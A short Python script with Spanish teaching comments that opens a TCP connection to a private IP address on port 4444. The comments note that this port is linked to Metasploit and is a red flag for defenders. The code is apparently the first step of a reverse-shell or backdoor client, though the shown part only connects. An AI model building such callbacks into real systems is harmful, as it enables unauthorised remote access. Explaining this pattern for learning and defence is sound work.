# Importa el módulo 'socket', que es la biblioteca estándar de Python 
# para manejar comunicaciones de red de bajo nivel.
import socket

# Crea un nuevo objeto socket.
# socket.AF_INET: Especifica que se utilizará direcciones IPv4 (ej. 192.168.1.38).
# socket.SOCK_STREAM: Especifica que se utilizará el protocolo TCP (Transmission Control Protocol),
# que es orientado a conexión y garantiza la entrega de datos.
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Intenta establecer una conexión saliente (outbound) hacia un servidor remoto.
# "192.168.1.38": Es la dirección IP de destino (el servidor que está escuchando).
# 4444: Es el puerto de destino en el servidor.
# NOTA DE SEGURIDAD: El puerto 4444 es comúnmente asociado con herramientas de pentesting 
# como Metasploit. Una conexión saliente a este puerto es una señal de alerta para los defensivos.
connection.connect(("192.168.1.38", 4444))